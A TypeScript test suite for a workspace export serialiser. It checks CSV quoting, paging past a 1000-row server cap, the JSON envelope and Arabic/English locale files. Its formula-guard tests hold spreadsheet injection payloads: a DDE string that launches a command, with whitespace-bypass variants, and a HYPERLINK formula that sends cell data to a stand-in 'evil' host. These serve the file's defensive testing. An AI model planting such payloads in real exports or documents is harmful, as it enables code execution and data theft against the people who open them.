// The export serialiser, under test.
//
// WHAT IS WORTH TESTING HERE, and it is not "does it produce a file". Three
// things, each of which fails silently and each of which fails in a file the
// user has already taken away:
//
//   1. CSV ESCAPING. A comma, a quote or a newline inside an entry title moves
//      every column after it by one. Nothing in the app notices; the spreadsheet
//      just has the description in the priority column.
//   2. THE FORMULA GUARD. A title beginning `=` is a script that runs on
//      whoever opens the export. There is no way to observe this short of
//      opening the file in Excel, which is exactly why it needs a test.
//   3. PAGING ASSEMBLY. PostgREST returns at most 1000 rows and says nothing
//      about the ones it withheld. A driver that stops at the first page looks
//      identical to a small workspace. The fake reader below is the only place
//      the boundary conditions — exact multiples, short pages, the cap — can be
//      exercised at all.
//
// `environment: 'node'`: nothing in lib/export.ts touches a document, and this
// file must not either.

import { describe, expect, it } from 'vitest'
import {
  CSV_BOM,
  CSV_EOL,
  CSV_MULTI_SEP,
  ENTRY_CSV_COLUMNS,
  EXPORT_MAX_PAGES,
  EXPORT_PAGE_SIZE,
  EXPORT_TABLES,
  buildEnvelope,
  bundleEntries,
  collectExport,
  csvCell,
  csvGuard,
  csvRow,
  entriesCsv,
  entryCsvRow,
  exportFilename,
  exportMimeType,
  serializeExport,
  toCsv,
  type EntryCsvContext,
  type ExportBundle,
  type ExportPageReader,
  type ExportProgress,
  type ExportTableKey,
  type ExportTableSpec,
} from './export'
import type { Entry } from '../types'
// The two locale files this feature owns, imported DIRECTLY rather than through
// the merged bundles. See the "export locale namespace" block at the foot of
// this file for why that distinction is the whole point.
import enExport from '../locales/en/export.json'
import arExport from '../locales/ar/export.json'
import { AR_NAMESPACES, EN_NAMESPACES, type LocaleTree } from '../locales'
import { isolatesBalanced } from './bidi'
import { PLURAL_CATEGORIES, isPluralNode, pluralCategory, type PluralCategory } from './plural'
import type { Locale } from './i18n'

/* ───────────────────────────────── fixtures ────────────────────────────── */

/** A complete entry; spread over it to vary one field. */
function entry(over: Partial<Entry> = {}): Entry {
  return {
    id: 'e1',
    track_id: 't1',
    node_id: null,
    title: 'Renew the core switch certificate',
    description: '',
    type: 'action',
    status: 'in_progress',
    priority: 'high',
    owner_id: 'u1',
    owner_name: null,
    requester: null,
    due_date: '2026-08-14',
    follow_up_date: null,
    tags: [],
    links: [],
    created_by: 'u1',
    created_at: '2026-07-01T09:00:00Z',
    updated_at: '2026-07-20T09:00:00Z',
    closed_at: null,
    last_activity_at: '2026-07-20T09:00:00Z',
    meeting_id: null,
    template_id: null,
    ...over,
  }
}

/** Resolvers that answer for exactly one track and one member. */
const ctx: EntryCsvContext = {
  trackName: (id) => (id === 't1' ? 'Network Ops' : ''),
  personName: (ownerId, ownerName) =>
    ownerId === 'u1' ? 'Sara Al-Otaibi' : (ownerName ?? ''),
}

/** The records of a CSV document, BOM and trailing terminator removed. */
function records(csv: string): string[] {
  expect(csv.startsWith(CSV_BOM)).toBe(true)
  const body = csv.slice(CSV_BOM.length)
  expect(body.endsWith(CSV_EOL)).toBe(true)
  return body.slice(0, -CSV_EOL.length).split(CSV_EOL)
}

/* ──────────────────────────── the table registry ───────────────────────── */

describe('EXPORT_TABLES', () => {
  it('covers the nine relations the spec names, and nothing else', () => {
    expect(EXPORT_TABLES.map((s) => s.key)).toEqual([
      'tracks',
      'vocab_options',
      'track_slas',
      'entries',
      'entry_updates',
      'meetings',
      'meeting_lines',
      'recurring_templates',
      'notifications',
    ])
  })

  it('gives every relation a total order, so paging cannot drop or duplicate', () => {
    // The last clause of each order must be unique WITHIN the ones before it.
    // A machine cannot check uniqueness against a schema it cannot see, so this
    // pins the intended tiebreak per relation and fails if one is ever removed.
    const tiebreak: Record<ExportTableKey, string> = {
      tracks: 'id',
      vocab_options: 'key',
      track_slas: 'priority',
      entries: 'id',
      entry_updates: 'id',
      meetings: 'id',
      meeting_lines: 'seq',
      recurring_templates: 'id',
      notifications: 'id',
    }
    for (const spec of EXPORT_TABLES) {
      expect(spec.order.length).toBeGreaterThan(0)
      expect(spec.order[spec.order.length - 1].column).toBe(tiebreak[spec.key])
    }
  })

  it('names each relation after its key — the two only diverge for a view', () => {
    for (const spec of EXPORT_TABLES) expect(spec.table).toBe(spec.key)
  })

  it('reads parents before children, so the JSON is legible top to bottom', () => {
    const at = (key: ExportTableKey): number => EXPORT_TABLES.findIndex((s) => s.key === key)
    expect(at('tracks')).toBeLessThan(at('entries'))
    expect(at('entries')).toBeLessThan(at('entry_updates'))
    expect(at('meetings')).toBeLessThan(at('meeting_lines'))
  })
})

/* ───────────────────────────── the formula guard ───────────────────────── */

describe('csvGuard', () => {
  it.each(['=1+1', '+1', '-1', '@SUM(A1)'])('neutralises a leading %s', (payload) => {
    expect(csvGuard(payload)).toBe(`'${payload}`)
  })

  it('neutralises the whitespace bypass Excel strips before deciding', () => {
    // `\t=cmd|'/c calc'!A0` reaches the same interpreter as `=cmd…` because the
    // leading tab is discarded first. This is the variant that turned formula
    // injection from a curiosity into a CVE class.
    expect(csvGuard('\t=cmd')).toBe("'\t=cmd")
    expect(csvGuard('\r=cmd')).toBe("'\r=cmd")
  })

  it('leaves ordinary text alone — the guard is not a blanket prefix', () => {
    for (const safe of ['Renew the certificate', 'ترقية المحوّل', '2026-08-14', '#tag', '']) {
      expect(csvGuard(safe)).toBe(safe)
    }
  })

  it('guards only the FIRST character, so an interior = is untouched', () => {
    expect(csvGuard('a=b')).toBe('a=b')
  })

  it('is idempotent in effect — a guarded cell no longer starts with a trigger', () => {
    expect(csvGuard(csvGuard('=1+1'))).toBe("'=1+1")
  })
})

/* ─────────────────────────────── cell writing ──────────────────────────── */

describe('csvCell', () => {
  it('writes nothing for a null or an undefined', () => {
    expect(csvCell(null)).toBe('')
    expect(csvCell(undefined)).toBe('')
  })

  it('leaves a NEGATIVE NUMBER a number', () => {
    // The guard must never reach a numeric cell: `'-5` sorts as text and breaks
    // every formula in the column the user was going to write. This is the one
    // case where the guard's own trigger set and legitimate data collide.
    expect(csvCell(-5)).toBe('-5')
    expect(csvCell(0)).toBe('0')
    expect(csvCell(3.5)).toBe('3.5')
  })

  it('writes an empty cell for a non-finite number rather than the text NaN', () => {
    expect(csvCell(Number.NaN)).toBe('')
    expect(csvCell(Number.POSITIVE_INFINITY)).toBe('')
  })

  it('guards a STRING that looks like a negative number', () => {
    // From a text column this is indistinguishable from `-1+1`, so it is text
    // and it is guarded. The asymmetry with the number above is the point.
    expect(csvCell('-5')).toBe("'-5")
  })

  it('writes booleans as Excel reads them', () => {
    expect(csvCell(true)).toBe('true')
    expect(csvCell(false)).toBe('false')
  })

  it('quotes a comma, so the row keeps its column count', () => {
    expect(csvCell('Switch, core')).toBe('"Switch, core"')
  })

  it('doubles an embedded quote and wraps the cell', () => {
    expect(csvCell('the "core" switch')).toBe('"the ""core"" switch"')
  })

  it('quotes a newline instead of ending the record', () => {
    expect(csvCell('line one\nline two')).toBe('"line one\nline two"')
    expect(csvCell('crlf\r\ninside')).toBe('"crlf\r\ninside"')
  })

  it('leaves Arabic exactly as it arrived', () => {
    expect(csvCell('ترقية المحوّل الأساسي')).toBe('ترقية المحوّل الأساسي')
  })

  it('quotes a guarded cell when it ALSO holds a delimiter', () => {
    // Guard first, quote second — the apostrophe must be inside the quotes or
    // the cell is two cells.
    expect(csvCell('=A1,B1')).toBe('"\'=A1,B1"')
  })

  it('renders an object as JSON rather than [object Object]', () => {
    expect(csvCell({ a: 1 })).toBe('"{""a"":1}"')
  })
})

describe('csvRow', () => {
  it('joins cells with a comma and terminates nothing', () => {
    expect(csvRow(['a', 1, null, true])).toBe('a,1,,true')
  })
})

describe('toCsv', () => {
  it('opens with the BOM, so Excel on Windows reads UTF-8', () => {
    // Without it every Arabic string in the file becomes mojibake on import.
    expect(toCsv(['a'], []).codePointAt(0)).toBe(0xfeff)
  })

  it('terminates every record with CRLF, the last one included', () => {
    const csv = toCsv(['a', 'b'], [['1', '2']])
    expect(csv).toBe(`${CSV_BOM}a,b${CSV_EOL}1,2${CSV_EOL}`)
  })

  it('writes a header-only file for no rows', () => {
    expect(records(toCsv(['a', 'b'], []))).toEqual(['a,b'])
  })

  it('puts the header through the same writer as the data', () => {
    expect(records(toCsv(['a,b'], []))).toEqual(['"a,b"'])
  })
})

/* ──────────────────────────── entries, flattened ───────────────────────── */

describe('entryCsvRow', () => {
  it('emits one value per declared column, in order', () => {
    expect(entryCsvRow(entry(), ctx)).toHaveLength(ENTRY_CSV_COLUMNS.length)
  })

  it('carries BOTH the resolved name and the id for track and owner', () => {
    const row = entryCsvRow(entry(), ctx)
    const at = (name: (typeof ENTRY_CSV_COLUMNS)[number]): unknown =>
      row[ENTRY_CSV_COLUMNS.indexOf(name)]
    expect(at('track')).toBe('Network Ops')
    expect(at('track_id')).toBe('t1')
    expect(at('owner')).toBe('Sara Al-Otaibi')
    expect(at('owner_id')).toBe('u1')
  })

  it('falls back to the free-text owner when there is no member id', () => {
    const row = entryCsvRow(entry({ owner_id: null, owner_name: 'Vendor NOC' }), ctx)
    expect(row[ENTRY_CSV_COLUMNS.indexOf('owner')]).toBe('Vendor NOC')
  })

  it('joins tags with the multi-value separator', () => {
    const row = entryCsvRow(entry({ tags: ['portal', 'direct-integration'] }), ctx)
    expect(row[ENTRY_CSV_COLUMNS.indexOf('tags')]).toBe(
      `portal${CSV_MULTI_SEP}direct-integration`,
    )
  })

  it('renders a link as label (url), and as the bare url when unlabelled', () => {
    const row = entryCsvRow(
      entry({
        links: [
          { label: 'Ticket', url: 'https://x/1' },
          { label: '  ', url: 'https://x/2' },
        ],
      }),
      ctx,
    )
    expect(row[ENTRY_CSV_COLUMNS.indexOf('links')]).toBe(
      `Ticket (https://x/1)${CSV_MULTI_SEP}https://x/2`,
    )
  })

  it('survives a row whose array columns are missing', () => {
    // Not schema-possible (`not null default '{}'`), but reachable from an older
    // cached row — and one bad row must not fail a whole export.
    const broken = entry()
    const loose = broken as unknown as Record<string, unknown>
    loose.tags = undefined
    loose.links = undefined
    const row = entryCsvRow(broken, ctx)
    expect(row[ENTRY_CSV_COLUMNS.indexOf('tags')]).toBe('')
    expect(row[ENTRY_CSV_COLUMNS.indexOf('links')]).toBe('')
  })
})

describe('entriesCsv', () => {
  it('round-trips Arabic, a comma and a newline through one row', () => {
    // The Wave-4 acceptance gate, item (h), as an assertion.
    const csv = entriesCsv(
      [entry({ title: 'ترقية المحوّل, الأساسي', description: 'سطر\nثانٍ' })],
      ctx,
    )
    const body = csv.slice(CSV_BOM.length)
    expect(body).toContain('"ترقية المحوّل, الأساسي"')
    expect(body).toContain('"سطر\nثانٍ"')
    // The embedded newline must not have become a record boundary: header,
    // then one row whose quoted field spans two physical lines.
    expect(body.split(CSV_EOL).filter((line) => line !== '')).toHaveLength(2)
  })

  it('neutralises a title that is a formula', () => {
    const csv = entriesCsv([entry({ title: '=HYPERLINK("https://evil/?x="&A1,"Click")' })], ctx)
    expect(csv).toContain('\'=HYPERLINK(')
    // And the raw, unguarded form is nowhere in the file.
    expect(csv).not.toContain('"=HYPERLINK')
  })

  it('writes the declared header, then one record per entry', () => {
    const rows = records(entriesCsv([entry({ id: 'a' }), entry({ id: 'b' })], ctx))
    expect(rows).toHaveLength(3)
    expect(rows[0]).toBe(ENTRY_CSV_COLUMNS.join(','))
    expect(rows[1].startsWith('a,')).toBe(true)
    expect(rows[2].startsWith('b,')).toBe(true)
  })

  it('keeps every record at the same column count under adversarial text', () => {
    // The property that matters: whatever a user typed, the grid stays a grid.
    const nasty = entry({
      title: 'a,b',
      description: 'he said "hi"\nthen left',
      owner_name: '=cmd|\'/c calc\'!A0',
      owner_id: null,
      tags: ['x,y', 'z"w'],
    })
    const csv = entriesCsv([nasty], ctx)
    expect(countColumns(csv)).toEqual([ENTRY_CSV_COLUMNS.length, ENTRY_CSV_COLUMNS.length])
  })
})

/**
 * Column count per record, parsed the way a real CSV reader does.
 *
 * Written out rather than `split(',')` precisely because the thing under test
 * is that splitting on a bare comma is WRONG — a test that used it would pass
 * on an escaping bug.
 */
function countColumns(csv: string): number[] {
  const text = csv.slice(CSV_BOM.length)
  const counts: number[] = []
  let columns = 1
  let quoted = false
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i]
    if (quoted) {
      if (ch !== '"') continue
      if (text[i + 1] === '"') {
        i += 1
        continue
      }
      quoted = false
      continue
    }
    if (ch === '"') quoted = true
    else if (ch === ',') columns += 1
    else if (ch === '\r' && text[i + 1] === '\n') {
      counts.push(columns)
      columns = 1
      i += 1
    }
  }
  return counts
}

/* ───────────────────────────── paging assembly ─────────────────────────── */

/** A spec for a fake relation, so paging can be tested without the registry. */
const FAKE: ExportTableSpec = {
  key: 'entries',
  table: 'entries',
  order: [{ column: 'id', ascending: true }],
}

/**
 * A reader over a fixed row count, honouring `offset`/`limit` the way PostgREST
 * does — including the clamp, which is the behaviour being defended against.
 */
function readerOver(total: number, calls: [number, number][] = []): ExportPageReader {
  return (_spec, offset, limit) => {
    calls.push([offset, limit])
    const size = Math.min(limit, EXPORT_PAGE_SIZE)
    const rows = Array.from({ length: Math.max(0, Math.min(size, total - offset)) }, (_, i) => ({
      id: offset + i,
    }))
    return Promise.resolve({ ok: true, data: rows })
  }
}

describe('collectExport paging', () => {
  it('returns a short first page without asking for a second', async () => {
    const calls: [number, number][] = []
    const result = await collectExport(readerOver(3, calls), undefined, [FAKE])
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.data.tables.entries).toHaveLength(3)
    expect(calls).toEqual([[0, EXPORT_PAGE_SIZE]])
  })

  it('pages past the 1000-row clamp instead of silently stopping at it', async () => {
    // THE BUG THIS MODULE EXISTS FOR. PostgREST answers a request for 2500 rows
    // with 1000 and a 200. A driver that trusts the response ships a third of
    // the workspace and says nothing.
    const calls: [number, number][] = []
    const result = await collectExport(readerOver(2500, calls), undefined, [FAKE])
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.data.tables.entries).toHaveLength(2500)
    expect(calls.map(([offset]) => offset)).toEqual([0, 1000, 2000])
    expect(result.data.truncated).toEqual([])
  })

  it('spends one extra round trip when the total is an exact multiple', async () => {
    // The stop condition is a SHORT page, not an empty one, and 2000 rows is
    // indistinguishable from 2000-and-more until the empty third page arrives.
    const calls: [number, number][] = []
    const result = await collectExport(readerOver(2000, calls), undefined, [FAKE])
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.data.tables.entries).toHaveLength(2000)
    expect(calls).toHaveLength(3)
  })

  it('keeps the server order across the page boundary', async () => {
    const result = await collectExport(readerOver(1500), undefined, [FAKE])
    expect(result.ok).toBe(true)
    if (!result.ok) return
    const ids = (result.data.tables.entries ?? []).map((row) => (row as { id: number }).id)
    expect(ids[0]).toBe(0)
    expect(ids[999]).toBe(999)
    expect(ids[1000]).toBe(1000)
    expect(ids[1499]).toBe(1499)
  })

  it('stops at the cap and SAYS SO rather than returning a partial read as whole', async () => {
    const huge = EXPORT_PAGE_SIZE * (EXPORT_MAX_PAGES + 5)
    const result = await collectExport(readerOver(huge), undefined, [FAKE])
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.data.tables.entries).toHaveLength(EXPORT_PAGE_SIZE * EXPORT_MAX_PAGES)
    expect(result.data.truncated).toEqual(['entries'])
  })

  it('reads an empty relation in one request', async () => {
    const calls: [number, number][] = []
    const result = await collectExport(readerOver(0, calls), undefined, [FAKE])
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.data.tables.entries).toEqual([])
    expect(calls).toHaveLength(1)
  })
})

describe('collectExport across relations', () => {
  const SPECS: readonly ExportTableSpec[] = [
    FAKE,
    { key: 'tracks', table: 'tracks', order: [{ column: 'id', ascending: true }] },
  ]

  it('reads every relation and totals the rows', async () => {
    const read: ExportPageReader = (spec) =>
      Promise.resolve({ ok: true, data: spec.key === 'entries' ? [{}, {}, {}] : [{}] })
    const result = await collectExport(read, undefined, SPECS)
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.data.rows).toBe(4)
    expect(Object.keys(result.data.tables)).toEqual(['entries', 'tracks'])
  })

  it('aborts on the first failure — a partial export must not look complete', async () => {
    const seen: ExportTableKey[] = []
    const read: ExportPageReader = (spec) => {
      seen.push(spec.key)
      if (spec.key === 'entries') return Promise.resolve({ ok: false, error: 'common.error' })
      return Promise.resolve({ ok: true, data: [] })
    }
    const result = await collectExport(read, undefined, SPECS)
    expect(result).toEqual({ ok: false, error: 'common.error' })
    // The second relation was never attempted.
    expect(seen).toEqual(['entries'])
  })

  it('forwards the error KEY untouched, for t() to resolve at render', async () => {
    const read: ExportPageReader = () =>
      Promise.resolve({ ok: false, error: 'common.notConfigured' })
    const result = await collectExport(read, undefined, SPECS)
    expect(result.ok).toBe(false)
    if (result.ok) return
    expect(result.error).toBe('common.notConfigured')
  })

  it('reports progress per PAGE, and finishes on a completed total', async () => {
    const seen: ExportProgress[] = []
    const read: ExportPageReader = (spec, offset) => {
      if (spec.key !== 'entries') return Promise.resolve({ ok: true, data: [{}] })
      const rows = offset === 0 ? Array.from({ length: EXPORT_PAGE_SIZE }, () => ({})) : [{}]
      return Promise.resolve({ ok: true, data: rows })
    }
    await collectExport(read, (p) => seen.push({ ...p }), SPECS)

    // Every report names the right total…
    expect(seen.every((p) => p.total === 2)).toBe(true)
    // …the row counter only ever grows…
    const counts = seen.map((p) => p.rows)
    expect([...counts].sort((a, b) => a - b)).toEqual(counts)
    // …the big relation reported more than once, so the counter is not frozen…
    expect(seen.filter((p) => p.table === 'entries').length).toBeGreaterThan(2)
    // …and the last report is the terminal one.
    expect(seen[seen.length - 1]).toEqual({
      completed: 2,
      total: 2,
      table: null,
      rows: EXPORT_PAGE_SIZE + 2,
    })
  })

  it('defaults to the full registry when no specs are given', async () => {
    const seen: string[] = []
    const read: ExportPageReader = (spec) => {
      seen.push(spec.table)
      return Promise.resolve({ ok: true, data: [] })
    }
    await collectExport(read)
    expect(seen).toEqual(EXPORT_TABLES.map((s) => s.table))
  })
})

/* ─────────────────────────────── the envelope ──────────────────────────── */

const META = { exportedAt: '2026-07-30T11:32:00.000Z', locale: 'ar', appVersion: '0.1.0' }

function bundle(over: Partial<ExportBundle> = {}): ExportBundle {
  return { tables: {}, truncated: [], rows: 0, ...over }
}

describe('buildEnvelope', () => {
  it('stamps the format, so a reader can tell this file from any other JSON', () => {
    const env = buildEnvelope(bundle(), META)
    expect(env.format).toBe('opstrack-export')
    expect(env.version).toBe(1)
  })

  it('carries the provenance the caller supplied, unchanged', () => {
    expect(buildEnvelope(bundle(), META)).toMatchObject(META)
  })

  it('counts every relation it carries', () => {
    const env = buildEnvelope(
      bundle({ tables: { entries: [{}, {}], tracks: [] }, rows: 2 }),
      META,
    )
    expect(env.counts).toEqual({ entries: 2, tracks: 0 })
  })

  it('surfaces truncation at the top level, not buried in the data', () => {
    expect(buildEnvelope(bundle({ truncated: ['entries'] }), META).truncated).toEqual(['entries'])
  })
})

describe('serializeExport', () => {
  it('round-trips Arabic as literal UTF-8, not as \\u escapes', () => {
    const text = serializeExport(
      buildEnvelope(bundle({ tables: { entries: [{ title: 'ترقية المحوّل' }] } }), META),
    )
    expect(text).toContain('ترقية المحوّل')
    expect(text).not.toContain('\\u0627')
  })

  it('round-trips commas, quotes and newlines with no escaping of ours', () => {
    const row = { title: 'a,b "c"\nd' }
    const text = serializeExport(buildEnvelope(bundle({ tables: { entries: [row] } }), META))
    const back = JSON.parse(text) as { data: { entries: { title: string }[] } }
    expect(back.data.entries[0].title).toBe(row.title)
  })

  it('is indented, because a person reads this file too', () => {
    expect(serializeExport(buildEnvelope(bundle(), META))).toContain('\n  "format"')
  })
})

describe('bundleEntries', () => {
  it('types the entries out of a bundle', () => {
    const row = entry()
    expect(bundleEntries(bundle({ tables: { entries: [row] } }))).toEqual([row])
  })

  it('answers empty for a bundle that never read them', () => {
    expect(bundleEntries(bundle())).toEqual([])
  })
})

/* ───────────────────────────────── filenames ───────────────────────────── */

describe('exportFilename', () => {
  it('stamps local date and time, sortable-first', () => {
    // Constructed from LOCAL components, so the assertion holds in any TZ.
    expect(exportFilename('json', new Date(2026, 6, 30, 14, 32))).toBe(
      'nphiescore-export-2026-07-30-1432.json',
    )
  })

  it('pads every field, so the folder sorts by name', () => {
    expect(exportFilename('csv', new Date(2026, 0, 5, 9, 7))).toBe(
      'nphiescore-export-2026-01-05-0907.csv',
    )
  })

  it('contains nothing a Windows share rejects', () => {
    const name = exportFilename('json', new Date(2026, 6, 30, 14, 32))
    expect(name).not.toMatch(/[:<>"/\\|?* ]/)
  })
})

describe('exportMimeType', () => {
  it('states the encoding, so the BOM is not decoded twice', () => {
    expect(exportMimeType('json')).toBe('application/json;charset=utf-8')
    expect(exportMimeType('csv')).toBe('text/csv;charset=utf-8')
  })
})

/* ─────────────────────────── the export namespace ──────────────────────── */
//
// WHY THIS BLOCK EXISTS, AND WHY IT IS NOT A DUPLICATE OF localeParity /
// localeReach / bidi.
//
// Those three gates iterate `EN_NAMESPACES` / `AR_NAMESPACES` in
// `src/locales/index.ts` — an INTEGRATOR-OWNED file (EXECUTION-PLAN §1.0.2)
// that a feature worker must not edit. Until the integrator wires these two
// JSON files in, all three gates are structurally blind to them: parity has no
// pair to compare, reach's ROOTS set has no `export` entry so every
// `'export.…'` literal in Export.tsx is skipped, and the bidi gate never sees a
// string. Green means nothing here, which is exactly the failure mode
// localeReach.test.ts's own header describes — eight `admin.tracks.sla*` keys
// that rode a handoff note into a release rendering their own dot paths.
//
// So the same policies run here, against the files directly, on this worker's
// machine. The imports are the JSON files rather than the merged bundles
// precisely so the assertions do not depend on the wiring they are covering.
//
// ONE CHECK IS NOT A DUPLICATE AT ALL: `table.*` is reached as
// t(`export.table.${key}`), a template literal that no source scan can resolve.
// It is the same blind spot `localeReach`'s FAMILIES block exists for, and this
// is where this namespace's family gets enumerated.

const TREES: readonly [Locale, LocaleTree][] = [
  ['en', enExport as LocaleTree],
  ['ar', arExport as LocaleTree],
]

/** `key → value` for every leaf, plural forms flattened as `key.category`. */
function leaves(tree: LocaleTree, prefix = '', out: [string, string][] = []): [string, string][] {
  for (const [k, v] of Object.entries(tree)) {
    const path = prefix ? `${prefix}.${k}` : k
    if (typeof v === 'string') out.push([path, v])
    else if (isPluralNode(v)) {
      for (const [c, form] of Object.entries(v)) out.push([`${path}.${c}`, form])
    } else leaves(v, path, out)
  }
  return out
}

/** Leaf PATHS, with a plural node counting as one leaf. */
function paths(tree: LocaleTree, prefix = '', out: string[] = []): string[] {
  for (const [k, v] of Object.entries(tree)) {
    const path = prefix ? `${prefix}.${k}` : k
    if (typeof v === 'string' || isPluralNode(v)) out.push(path)
    else paths(v, path, out)
  }
  return out
}

/** Every plural node in the tree, keyed by path. */
function pluralNodes(tree: LocaleTree, prefix = ''): [string, Record<string, string>][] {
  const out: [string, Record<string, string>][] = []
  for (const [k, v] of Object.entries(tree)) {
    if (typeof v === 'string') continue
    const path = prefix ? `${prefix}.${k}` : k
    if (isPluralNode(v)) out.push([path, v as unknown as Record<string, string>])
    else out.push(...pluralNodes(v, path))
  }
  return out
}

function tokensOf(value: string): string[] {
  return [...value.matchAll(/\{(\w+)\}/g)].map((m) => m[1]).sort()
}

describe('export locale namespace', () => {
  it('holds exactly one root, matching the filename, in both languages', () => {
    // The invariant `src/locales/index.ts`'s flat spread depends on: a second
    // root in one file would silently win or lose by import order.
    for (const [locale, tree] of TREES) {
      expect(Object.keys(tree), locale).toEqual(['export'])
    }
  })

  it('holds identical key sets in both languages', () => {
    const [en, ar] = TREES.map(([, tree]) => paths(tree).sort())
    expect(ar).toEqual(en)
  })

  it('has no empty string anywhere', () => {
    for (const [locale, tree] of TREES) {
      const empty = leaves(tree)
        .filter(([, v]) => v.trim() === '')
        .map(([k]) => k)
      expect(empty, locale).toEqual([])
    }
  })

  it('labels every relation the exporter reads', () => {
    // The template-literal blind spot: t(`export.table.${spec.key}`) is invisible
    // to localeReach's source scan, so a relation added to EXPORT_TABLES without
    // a label would render its own dot path in the "what's included" list — in
    // both languages, with every other gate green.
    const wanted = EXPORT_TABLES.map((s) => `export.table.${s.key}`).sort()
    for (const [locale, tree] of TREES) {
      const got = paths(tree)
        .filter((p) => p.startsWith('export.table.'))
        .sort()
      expect(got, locale).toEqual(wanted)
    }
  })
})

describe('export locale namespace — plurals', () => {
  it.each(TREES)('%s ships only forms its language can select', (locale, tree) => {
    const selectable = new Set<PluralCategory>()
    for (let n = 0; n <= 200; n += 1) selectable.add(pluralCategory(locale, n))
    const unreachable: string[] = []
    for (const [path, node] of pluralNodes(tree)) {
      for (const c of Object.keys(node)) {
        if (!selectable.has(c as PluralCategory)) unreachable.push(`${path}.${c}`)
      }
    }
    expect(unreachable).toEqual([])
  })

  it.each(TREES)('%s keeps {count} in every form covering more than one number', (_l, tree) => {
    // zero/one/two pin the value, so "صفّ واحد" is correct and complete. `few`,
    // `many` and `other` cover ranges and lose information without the number.
    const RANGE: readonly string[] = ['few', 'many', 'other']
    const missing: string[] = []
    for (const [path, node] of pluralNodes(tree)) {
      for (const [c, form] of Object.entries(node)) {
        if (RANGE.includes(c) && !form.includes('{count}')) missing.push(`${path}.${c}`)
      }
    }
    expect(missing).toEqual([])
  })

  it('gives the Arabic counters a `zero`, because both counts reach 0', () => {
    // The first progress report fires at 0 rows, and an empty workspace finishes
    // at 0. Arabic selects `zero` for n=0; without the form it falls back to
    // `other`, which is the 11–99 shape and ungrammatical here. See the `zero`
    // audit in lib/plural.ts — this is the rule that audit codifies.
    const ar = Object.fromEntries(pluralNodes(arExport as LocaleTree))
    expect(Object.keys(ar['export.rowsSoFar'])).toContain('zero')
    expect(Object.keys(ar['export.done'])).toContain('zero')
  })

  it('agrees on the tokens of the `other` form across languages', () => {
    const [en, ar] = TREES.map(([, tree]) => new Map(pluralNodes(tree)))
    for (const [path, node] of en) {
      expect(tokensOf(ar.get(path)?.other ?? ''), path).toEqual(tokensOf(node.other))
    }
  })
})

describe('export locale namespace — direction', () => {
  /**
   * The tokens whose VALUE can begin with a Latin letter or a digit, mirroring
   * `USER_VALUE_TOKENS` in bidi.test.ts. `label` is a translated relation name,
   * `name` is a filename, and `list` is those labels joined — all three can be
   * either script, so all three are fenced with FSI in BOTH trees.
   *
   * `count` is deliberately absent, for the reason bidi.test.ts gives: a bare
   * number beside Arabic already reads correctly, and fencing one only detaches
   * the punctuation that belongs to it.
   */
  const FENCED: ReadonlySet<string> = new Set(['label', 'list', 'name'])

  it.each(TREES)('%s never leaves an isolate open', (_l, tree) => {
    const broken = leaves(tree)
      .filter(([, v]) => !isolatesBalanced(v))
      .map(([k]) => k)
    expect(broken).toEqual([])
  })

  it.each(TREES)('%s fences every interpolation that can run the other way', (_l, tree) => {
    // `جارٍ قراءة {label}…` with a Latin relation name puts the ellipsis on the
    // wrong side of it; `Saved as {name}.` with an Arabic filename moves the
    // full stop into the middle. Fix by wrapping the token: `⁨{label}⁩`.
    const bare: string[] = []
    let checked = 0
    for (const [key, value] of leaves(tree)) {
      for (const m of value.matchAll(/\{(\w+)\}/g)) {
        if (!FENCED.has(m[1])) continue
        checked += 1
        const before = value.slice(0, m.index)
        const closes = value.startsWith('⁩', m.index + m[1].length + 2)
        if (!/[⁦-⁨]$/.test(before) || !closes) bare.push(`${key} {${m[1]}}`)
      }
    }
    expect(bare).toEqual([])
    // Not vacuous: a rename of `label`/`list`/`name` that this set did not
    // follow would otherwise turn the assertion above into a no-op.
    expect(checked).toBe(FENCED.size)
  })

  it('isolates the Latin symbol run in the Arabic CSV caveat', () => {
    // `= أو + أو @` is three NEUTRALS in an RTL paragraph: they take the
    // paragraph's direction and the list renders back to front. Each symbol is
    // its own LRI run so the sentence names them in the order it wrote them.
    const caveat = (arExport as LocaleTree).export as LocaleTree
    expect(String(caveat.csvCaveats)).toContain('⁦=⁩')
    expect(String(caveat.csvCaveats)).toContain('⁦@⁩')
  })

  it('writes no bare numeric range in Arabic', () => {
    // A literal `0–3` between two European numbers reverses under dir="rtl".
    const RANGE = /\d\s*[–—-]\s*\d/
    const bare = leaves(arExport as LocaleTree)
      .filter(([, v]) => RANGE.test(v))
      .map(([k]) => k)
    expect(bare).toEqual([])
  })

  it('uses only categories the plural table knows', () => {
    for (const [locale, tree] of TREES) {
      for (const [path, node] of pluralNodes(tree)) {
        for (const c of Object.keys(node)) {
          expect(PLURAL_CATEGORIES as readonly string[], `${locale} ${path}`).toContain(c)
        }
      }
    }
  })
})

/* ───────────────────── reachability, scoped to this feature ────────────── */

/**
 * The screen's own source, as text.
 *
 * Same mechanism localeReach.test.ts uses and for the same reason — reading
 * through `node:fs` would need "node" in tsconfig.app.json's `types` array,
 * which is the one thing that array is pinned to prevent. Scoped to the one
 * file this feature owns, because the repo-wide scan cannot see this namespace
 * until it is wired (see below).
 */
const PAGE_SOURCE: Record<string, string> = import.meta.glob(
  '../pages/settings/Export.tsx',
  { query: '?raw', import: 'default', eager: true },
)

describe('export locale namespace — reachability', () => {
  it('reads the page source', () => {
    // A glob that resolved to nothing would make the assertion below vacuous.
    expect(Object.keys(PAGE_SOURCE)).toHaveLength(1)
  })

  it('resolves every export.* key the screen asks for, in both languages', () => {
    const [enPaths, arPaths] = TREES.map(([, tree]) => new Set(paths(tree)))
    const missing: string[] = []
    for (const source of Object.values(PAGE_SOURCE)) {
      for (const m of source.matchAll(/(['"])(export\.[A-Za-z0-9_.]+)\1/g)) {
        const key = m[2]
        const gaps = [!enPaths.has(key) && 'en', !arPaths.has(key) && 'ar'].filter(Boolean)
        if (gaps.length > 0) missing.push(`${key} — missing from ${gaps.join('+')}`)
      }
    }
    expect([...new Set(missing)].sort()).toEqual([])
  })
})

/* ─────────────────────────── the wiring handshake ──────────────────────── */
//
